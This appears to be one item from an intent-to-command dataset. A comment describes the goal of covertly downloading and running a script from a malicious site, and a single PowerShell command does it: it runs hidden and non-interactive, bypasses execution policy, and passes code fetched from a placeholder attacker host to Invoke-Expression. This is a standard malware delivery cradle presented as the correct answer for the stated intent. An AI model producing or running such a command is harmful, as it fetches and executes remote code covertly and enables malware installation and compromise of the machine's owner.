# Natural language intent:
# Execute a hidden PowerShell command with bypassed execution policy to download and execute a script from a specified malicious site.

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com')"
